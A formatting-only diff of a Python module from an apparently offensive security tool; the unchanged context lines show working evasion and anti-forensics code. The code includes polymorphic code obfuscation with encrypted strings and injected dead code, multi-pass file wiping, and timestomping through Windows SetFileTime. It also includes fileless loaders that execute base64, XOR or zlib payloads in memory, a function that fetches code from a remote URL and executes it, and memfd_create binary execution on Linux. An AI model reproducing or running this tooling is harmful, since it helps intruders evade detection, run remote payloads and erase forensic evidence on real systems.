@@ -33,31 +33,121 @@ OBFUSCATION_CHARS = string.ascii_letters + "_"
 
 # Reserved Python keywords that cannot be used as variable names
 PYTHON_KEYWORDS = {
-    "False", "None", "True", "and", "as", "assert", "async", "await",
-    "break", "class", "continue", "def", "del", "elif", "else", "except",
-    "finally", "for", "from", "global", "if", "import", "in", "is",
-    "lambda", "nonlocal", "not", "or", "pass", "raise", "return", "try",
-    "while", "with", "yield"
+    "False",
+    "None",
+    "True",
+    "and",
+    "as",
+    "assert",
+    "async",
+    "await",
+    "break",
+    "class",
+    "continue",
+    "def",
+    "del",
+    "elif",
+    "else",
+    "except",
+    "finally",
+    "for",
+    "from",
+    "global",
+    "if",
+    "import",
+    "in",
+    "is",
+    "lambda",
+    "nonlocal",
+    "not",
+    "or",
+    "pass",
+    "raise",
+    "return",
+    "try",
+    "while",
+    "with",
+    "yield",
 }
 
 # Built-in names that should not be obfuscated
 BUILTIN_NAMES = {
-    "print", "len", "range", "str", "int", "float", "list", "dict", "set",
-    "tuple", "bool", "open", "input", "type", "isinstance", "hasattr",
-    "getattr", "setattr", "delattr", "enumerate", "zip", "map", "filter",
-    "sorted", "reversed", "sum", "min", "max", "abs", "all", "any",
-    "bin", "hex", "oct", "ord", "chr", "format", "repr", "hash", "id",
-    "dir", "vars", "globals", "locals", "callable", "exec", "eval",
-    "compile", "__import__", "Exception", "BaseException", "ValueError",
-    "TypeError", "KeyError", "IndexError", "AttributeError", "RuntimeError",
-    "self", "cls", "args", "kwargs", "__name__", "__main__", "__init__",
-    "__str__", "__repr__", "__call__", "__enter__", "__exit__"
+    "print",
+    "len",
+    "range",
+    "str",
+    "int",
+    "float",
+    "list",
+    "dict",
+    "set",
+    "tuple",
+    "bool",
+    "open",
+    "input",
+    "type",
+    "isinstance",
+    "hasattr",
+    "getattr",
+    "setattr",
+    "delattr",
+    "enumerate",
+    "zip",
+    "map",
+    "filter",
+    "sorted",
+    "reversed",
+    "sum",
+    "min",
+    "max",
+    "abs",
+    "all",
+    "any",
+    "bin",
+    "hex",
+    "oct",
+    "ord",
+    "chr",
+    "format",
+    "repr",
+    "hash",
+    "id",
+    "dir",
+    "vars",
+    "globals",
+    "locals",
+    "callable",
+    "exec",
+    "eval",
+    "compile",
+    "__import__",
+    "Exception",
+    "BaseException",
+    "ValueError",
+    "TypeError",
+    "KeyError",
+    "IndexError",
+    "AttributeError",
+    "RuntimeError",
+    "self",
+    "cls",
+    "args",
+    "kwargs",
+    "__name__",
+    "__main__",
+    "__init__",
+    "__str__",
+    "__repr__",
+    "__call__",
+    "__enter__",
+    "__exit__",
 }
 
 
 # =============================================================================
 # POLYMORPHIC TRANSFORMER
 # =============================================================================
+
 
 class PolymorphicTransformer(ast.NodeTransformer):
     """
@@ -79,7 +169,7 @@ class PolymorphicTransformer(ast.NodeTransformer):
         obfuscate_names: bool = True,
         inject_dead_code: bool = True,
         encrypt_strings: bool = True,
-        preserve_docstrings: bool = True
+        preserve_docstrings: bool = True,
     ):
         """
         Initialize transformer with configuration.
@@ -163,12 +253,12 @@ class PolymorphicTransformer(ast.NodeTransformer):
         self._name_counter += 1
 
         # Generate a name like _x7a3b2c1_ (underscore prefixed and suffixed)
-        random_part = ''.join(random.choices(OBFUSCATION_CHARS, k=8))
+        random_part = "".join(random.choices(OBFUSCATION_CHARS, k=8))
         name = f"_{random_part}{self._name_counter}_"
 
         # Ensure it's not a keyword
         while name in PYTHON_KEYWORDS:
-            random_part = ''.join(random.choices(OBFUSCATION_CHARS, k=8))
+            random_part = "".join(random.choices(OBFUSCATION_CHARS, k=8))
             name = f"_{random_part}{self._name_counter}_"
 
         return name
@@ -195,17 +285,21 @@ class PolymorphicTransformer(ast.NodeTransformer):
     def visit_FunctionDef(self, node: ast.FunctionDef) -> ast.FunctionDef:  # pylint: disable=invalid-name
         """Transform function definitions"""
         # Preserve docstring if configured
-        if (self.preserve_docstrings and
-            node.body and
-            isinstance(node.body[0], ast.Expr) and
-            isinstance(node.body[0].value, ast.Constant) and
-            isinstance(node.body[0].value.value, str)):
-            pass # Docstring logic placeholder
+        if (
+            self.preserve_docstrings
+            and node.body
+            and isinstance(node.body[0], ast.Expr)
+            and isinstance(node.body[0].value, ast.Constant)
+            and isinstance(node.body[0].value.value, str)
+        ):
+            pass  # Docstring logic placeholder
 
         # Obfuscate function name (except main and special methods)
-        if (self.obfuscate_names and
-            not node.name.startswith("__") and
-            node.name not in ("main", "run")):
+        if (
+            self.obfuscate_names
+            and not node.name.startswith("__")
+            and node.name not in ("main", "run")
+        ):
             node.name = self._get_obfuscated_name(node.name)
 
         # Obfuscate argument names
@@ -229,29 +323,30 @@ class PolymorphicTransformer(ast.NodeTransformer):
 
     def visit_Constant(self, node: ast.Constant) -> ast.AST:  # pylint: disable=invalid-name
         """Transform string constants (encryption) - Python 3.8+"""
-        if (self.encrypt_strings and
-            isinstance(node.value, str) and
-            len(node.value) > 3 and
-            not node.value.startswith("__")):
-
+        if (
+            self.encrypt_strings
+            and isinstance(node.value, str)
+            and len(node.value) > 3
+            and not node.value.startswith("__")
+        ):
             # Skip docstrings (handled separately)
             return self._create_encrypted_string(node.value)
 
         return node
 
     # Compatibility for Python < 3.8 (Legacy Servers)
-    def visit_Str(self, node: ast.Str) -> ast.AST: # pylint: disable=invalid-name, no-member
+    def visit_Str(self, node: ast.Str) -> ast.AST:  # pylint: disable=invalid-name, no-member
         """Forward legacy Str nodes to Constant handler"""
         # Create a ephemeral Constant node to reuse logic
         fake_constant = ast.Constant(value=node.s)
         result = self.visit_Constant(fake_constant)
-        
+
         # If result changed (encrypted), return it
         if result is not fake_constant:
-             return result
+            return result
         return node
 
-    def visit_Num(self, node: ast.Num) -> ast.AST: # pylint: disable=invalid-name, no-member
+    def visit_Num(self, node: ast.Num) -> ast.AST:  # pylint: disable=invalid-name, no-member
         """Forward legacy Num nodes (no encryption needed but good practice)"""
         return node
 
@@ -268,19 +363,19 @@ class PolymorphicTransformer(ast.NodeTransformer):
                         value=ast.Call(
                             func=ast.Name(id="__import__", ctx=ast.Load()),
                             args=[ast.Constant(value="base64")],
-                            keywords=[]
+                            keywords=[],
                         ),
                         attr="b64decode",
-                        ctx=ast.Load()
+                        ctx=ast.Load(),
                     ),
                     args=[ast.Constant(value=encoded)],
-                    keywords=[]
+                    keywords=[],
                 ),
                 attr="decode",
-                ctx=ast.Load()
+                ctx=ast.Load(),
             ),
             args=[],
-            keywords=[]
+            keywords=[],
         )
 
     def _inject_dead_code_blocks(self, tree: ast.Module) -> ast.Module:
@@ -288,21 +383,18 @@ class PolymorphicTransformer(ast.NodeTransformer):
         dead_code_templates = [
             ast.If(
                 test=ast.Constant(value=False),
-                body=[
-                    ast.Expr(value=ast.Constant(value=None)),
-                    ast.Pass()
-                ],
-                orelse=[]
+                body=[ast.Expr(value=ast.Constant(value=None)), ast.Pass()],
+                orelse=[],
             ),
             # Unreachable after return
             ast.If(
                 test=ast.Compare(
                     left=ast.Constant(value=0),
                     ops=[ast.Gt()],
-                    comparators=[ast.Constant(value=1)]
+                    comparators=[ast.Constant(value=1)],
                 ),
                 body=[ast.Pass()],
-                orelse=[]
+                orelse=[],
             ),
         ]
 
@@ -322,6 +414,7 @@ class PolymorphicTransformer(ast.NodeTransformer):
 # STRING ENCRYPTION UTILITIES
 # =============================================================================
 
+
 class StringEncryptor:
     """
     Utility class for string encryption/decryption.
@@ -335,33 +428,35 @@ class StringEncryptor:
         result = []
         for i, char in enumerate(text):
             result.append(chr(ord(char) ^ ord(key[i % len(key)])))
-        return base64.b64encode(''.join(result).encode('latin-1')).decode()
+        return base64.b64encode("".join(result).encode("latin-1")).decode()
 
     @staticmethod
     def xor_decrypt(encrypted: str, key: str = "drakben") -> str:
         """XOR decrypt a string"""
         try:
-            decoded = base64.b64decode(encrypted).decode('latin-1')
+            decoded = base64.b64decode(encrypted).decode("latin-1")
             result = []
             for i, char in enumerate(decoded):
                 result.append(chr(ord(char) ^ ord(key[i % len(key)])))
-            return ''.join(result)
+            return "".join(result)
         except Exception:
             return encrypted
 
     @staticmethod
     def rot13(text: str) -> str:
         """Apply ROT13 encoding"""
-        return text.translate(str.maketrans(
-            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
-            "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"
-        ))
+        return text.translate(
+            str.maketrans(
+                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
+                "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm",
+            )
+        )
 
     @staticmethod
     def chunk_and_join(text: str) -> Tuple[List[str], str]:
         """Split string into chunks for concatenation"""
         chunk_size = random.randint(2, 5)
-        chunks = [text[i:i+chunk_size] for i in range(0, len(text), chunk_size)]
+        chunks = [text[i : i + chunk_size] for i in range(0, len(text), chunk_size)]
         var_names = [f"_s{i}_" for i in range(len(chunks))]
         return chunks, " + ".join(var_names)
 
@@ -369,6 +464,7 @@ class StringEncryptor:
 # =============================================================================
 # SECURE MEMORY & ANTI-FORENSICS
 # =============================================================================
+
 
 class SecureCleanup:
     """
@@ -403,10 +499,10 @@ class SecureCleanup:
                     f.seek(0)
                     if pass_num % 3 == 0:
                         # Pass 1: All zeros
-                        f.write(b'\x00' * file_size)
+                        f.write(b"\x00" * file_size)
                     elif pass_num % 3 == 1:
                         # Pass 2: All ones
-                        f.write(b'\xFF' * file_size)
+                        f.write(b"\xff" * file_size)
                     else:
                         # Pass 3: Random data
                         f.write(os.urandom(file_size))
@@ -428,7 +524,7 @@ class SecureCleanup:
 
         Note: Strings in Python are immutable. We cannot safely overwrite them in place
         without risking a segmentation fault in modern Python versions (3.12+).
-        
+
         Best effort: Remove reference and suggest GC.
         """
         try:
@@ -462,25 +558,31 @@ class SecureCleanup:
             else:
                 atime = 1577836800  # 2020-01-01 00:00:00 UTC
                 mtime = 1577836800
-                
+
             os.utime(filepath, (atime, mtime))
 
             # 2. Windows Specific: Change Creation Time using ctypes
-            if os.name == 'nt':
+            if os.name == "nt":
                 try:
                     from ctypes import windll, wintypes, byref
-                    
+
                     # Filetime structure
                     timestamp = int(mtime * 10000000) + 116444736000000000
                     ctime = wintypes.FILETIME(timestamp & 0xFFFFFFFF, timestamp >> 32)
-                    atime_ft = wintypes.FILETIME(timestamp & 0xFFFFFFFF, timestamp >> 32)
-                    mtime_ft = wintypes.FILETIME(timestamp & 0xFFFFFFFF, timestamp >> 32)
-                    
+                    atime_ft = wintypes.FILETIME(
+                        timestamp & 0xFFFFFFFF, timestamp >> 32
+                    )
+                    mtime_ft = wintypes.FILETIME(
+                        timestamp & 0xFFFFFFFF, timestamp >> 32
+                    )
+
                     handle = windll.kernel32.CreateFileW(
                         filepath, 256, 0, None, 3, 128, None
                     )
                     if handle != -1:
-                        windll.kernel32.SetFileTime(handle, byref(ctime), byref(atime_ft), byref(mtime_ft))
+                        windll.kernel32.SetFileTime(
+                            handle, byref(ctime), byref(atime_ft), byref(mtime_ft)
+                        )
                         windll.kernel32.CloseHandle(handle)
                 except Exception as ex:
                     logger.debug(f"Windows creation time stomp failed: {ex}")
@@ -496,6 +598,7 @@ class SecureCleanup:
 # =============================================================================
 # GHOST PROTOCOL MANAGER
 # =============================================================================
+
 
 class GhostProtocol:
     """
@@ -514,7 +617,7 @@ class GhostProtocol:
         self,
         enable_obfuscation: bool = True,
         enable_encryption: bool = True,
-        enable_dead_code: bool = True
+        enable_dead_code: bool = True,
     ):
         """
         Initialize Ghost Protocol.
@@ -527,7 +630,7 @@ class GhostProtocol:
         self.transformer = PolymorphicTransformer(
             obfuscate_names=enable_obfuscation,
             encrypt_strings=enable_encryption,
-            inject_dead_code=enable_dead_code
+            inject_dead_code=enable_dead_code,
         )
         self.encryptor = StringEncryptor()
         self.cleanup = SecureCleanup()
@@ -618,6 +721,7 @@ class GhostProtocol:
 # MODULE-LEVEL FUNCTIONS
 # =============================================================================
 
+
 def obfuscate(code: str) -> str:
     """
     Quick-access function to obfuscate code.
@@ -632,9 +736,9 @@ def obfuscate(code: str) -> str:
     return transformer.transform(code)
 
 
-
 # Singleton
 _ghost_protocol = None  # pylint: disable=invalid-name
+
 
 def get_ghost_protocol() -> GhostProtocol:
     """
@@ -652,6 +756,7 @@ def get_ghost_protocol() -> GhostProtocol:
 # =============================================================================
 # MEMORY-ONLY EXECUTION (Fileless)
 # =============================================================================
+
 
 class MemoryOnlyExecutor:
     """
@@ -671,9 +776,7 @@ class MemoryOnlyExecutor:
         logger.info("MemoryOnlyExecutor initialized")
 
     def execute_code(
-        self,
-        code: str,
-        namespace: Dict[str, Any] = None
+        self, code: str, namespace: Dict[str, Any] = None
     ) -> Tuple[bool, Any]:
         """
         Execute Python code entirely in memory.
@@ -709,11 +812,7 @@ class MemoryOnlyExecutor:
             return False, str(e)
 
     def execute_function(
-        self,
-        code: str,
-        function_name: str,
-        args: tuple = (),
-        kwargs: dict = None
+        self, code: str, function_name: str, args: tuple = (), kwargs: dict = None
     ) -> Tuple[bool, Any]:
         """
         Execute a function defined in memory.
@@ -746,11 +845,7 @@ class MemoryOnlyExecutor:
             logger.error(f"Memory function execution failed: {e}")
             return False, str(e)
 
-    def create_module_in_memory(
-        self,
-        module_name: str,
-        code: str
-    ) -> Tuple[bool, Any]:
+    def create_module_in_memory(self, module_name: str, code: str) -> Tuple[bool, Any]:
         """
         Create a Python module entirely in memory.
 
@@ -826,6 +921,7 @@ class SecureMemory:
         """
         try:
             import ctypes
+
             # String object header is typically 48 bytes in CPython
             ctypes.memset(buffer_id + 48, 0, length)
             return True
@@ -841,6 +937,7 @@ class SecureMemory:
             Number of objects collected
         """
         import gc
+
         return gc.collect()
 
     @staticmethod
@@ -917,7 +1014,7 @@ class FilelessLoader:
             Tuple of (success, result_or_error)
         """
         try:
-            code = base64.b64decode(encoded).decode('utf-8')
+            code = base64.b64decode(encoded).decode("utf-8")
             result = self.executor.execute_code(code)
 
             # Attempt to wipe decoded code from memory
@@ -928,11 +1025,7 @@ class FilelessLoader:
         except Exception as e:
             return False, str(e)
 
-    def load_xor_payload(
-        self,
-        encrypted: bytes,
-        key: bytes
-    ) -> Tuple[bool, Any]:
+    def load_xor_payload(self, encrypted: bytes, key: bytes) -> Tuple[bool, Any]:
         """
         Load and execute XOR encrypted Python code.
 
@@ -949,7 +1042,7 @@ class FilelessLoader:
             for i, byte in enumerate(encrypted):
                 decrypted[i] = byte ^ key[i % len(key)]
 
-            code = decrypted.decode('utf-8')
+            code = decrypted.decode("utf-8")
             result = self.executor.execute_code(code)
 
             # Secure wipe
@@ -972,16 +1065,14 @@ class FilelessLoader:
         """
         try:
             import zlib
-            code = zlib.decompress(compressed).decode('utf-8')
+
+            code = zlib.decompress(compressed).decode("utf-8")
             return self.executor.execute_code(code)
         except Exception as e:
             return False, str(e)
 
     def load_remote_payload(
-        self,
-        url: str,
-        headers: Dict[str, str] = None,
-        decode: str = None
+        self, url: str, headers: Dict[str, str] = None, decode: str = None
     ) -> Tuple[bool, Any]:
         """
         Fetch and execute code from remote URL (in-memory only).
@@ -1005,10 +1096,10 @@ class FilelessLoader:
             with urllib.request.urlopen(request, timeout=30) as response:
                 data = response.read()
 
-            if decode == 'base64':
-                code = base64.b64decode(data).decode('utf-8')
+            if decode == "base64":
+                code = base64.b64decode(data).decode("utf-8")
             else:
-                code = data.decode('utf-8')
+                code = data.decode("utf-8")
 
             return self.executor.execute_code(code)
 
@@ -1045,16 +1136,14 @@ class LinuxFilelessExecutor:
         """Check if memfd_create is available"""
         try:
             import ctypes
+
             libc = ctypes.CDLL("libc.so.6", use_errno=True)
-            return hasattr(libc, 'memfd_create')
+            return hasattr(libc, "memfd_create")
         except Exception:
             return False
 
     def execute_binary_in_memory(
-        self,
-        binary_data: bytes,
-        args: List[str] = None,
-        name: str = "payload"
+        self, binary_data: bytes, args: List[str] = None, name: str = "payload"
     ) -> Tuple[bool, str]:
         """
         Execute a binary entirely from memory using memfd_create.
@@ -1094,11 +1183,7 @@ class LinuxFilelessExecutor:
             # Execute
             cmd = [fd_path] + (args or [])
             result = subprocess.run(
-                cmd,
-                capture_output=True,
-                text=True,
-                timeout=60,
-                check=False
+                cmd, capture_output=True, text=True, timeout=60, check=False
             )
 
             os.close(fd)
@@ -1116,6 +1201,7 @@ class LinuxFilelessExecutor:
 # =============================================================================
 # EXTENDED MODULE-LEVEL FUNCTIONS
 # =============================================================================
+
 
 def execute_in_memory(code: str) -> Tuple[bool, Any]:
     """
@@ -1145,9 +1231,9 @@ def load_encoded_payload(payload: str) -> Tuple[bool, Any]:
     return loader.load_base64_payload(payload)
 
 
-
 # Global singleton
 _fileless_loader = None  # pylint: disable=invalid-name
+
 
 def get_fileless_loader() -> FilelessLoader:
     """
@@ -1166,6 +1252,7 @@ def get_fileless_loader() -> FilelessLoader:
 # SECURE MEMORY - RAM Cleanup Module (Stateful Extension)
 # =============================================================================
 
+
 class RAMCleaner:
     """
     Stateful memory manager for trakcing and wiping sensitive data.
@@ -1182,7 +1269,7 @@ class RAMCleaner:
         Data is stored as mutable bytearray for secure deletion.
         """
         # Convert to bytearray (mutable)
-        ba = bytearray(data.encode('utf-8'))
+        ba = bytearray(data.encode("utf-8"))
         ref_id = id(ba)
         self._sensitive_refs.append(ba)
         return ref_id
@@ -1217,7 +1304,7 @@ class RAMCleaner:
         if not data:
             return
         # Create a mutable bytearray copy of the data
-        ba = bytearray(data.encode('utf-8'))
+        ba = bytearray(data.encode("utf-8"))
         self._sensitive_refs.append(ba)
 
     def wipe_all(self) -> int:
@@ -1236,7 +1323,7 @@ class RAMCleaner:
         logger.info("Wiped %d sensitive data items from RAM", count)
         return count
 
-    def secure_string(self, data: str) -> 'SecureString':
+    def secure_string(self, data: str) -> "SecureString":
         """Create a secure string that auto-wipes"""
         return SecureString(data, self)
 
@@ -1247,16 +1334,16 @@ class SecureString:
     """
 
     def __init__(self, data: str, manager: RAMCleaner):
-        self._data = bytearray(data.encode('utf-8'))
+        self._data = bytearray(data.encode("utf-8"))
         self._manager = manager
 
     def get(self) -> str:
         """Get the string value"""
-        return self._data.decode('utf-8')
+        return self._data.decode("utf-8")
 
     def __del__(self):
         """Securely wipe on garbage collection"""
-        if hasattr(self, '_data'):
+        if hasattr(self, "_data"):
             for i, _ in enumerate(self._data):
                 self._data[i] = 0
             del self._data
@@ -1271,11 +1358,10 @@ class SecureString:
 # Singleton
 _ram_cleaner = None  # pylint: disable=invalid-name
 
+
 def get_ram_cleaner() -> RAMCleaner:
     """Get singleton RAMCleaner instance"""
     global _ram_cleaner  # pylint: disable=global-statement
     if _ram_cleaner is None:
         _ram_cleaner = RAMCleaner()
     return _ram_cleaner
-
-
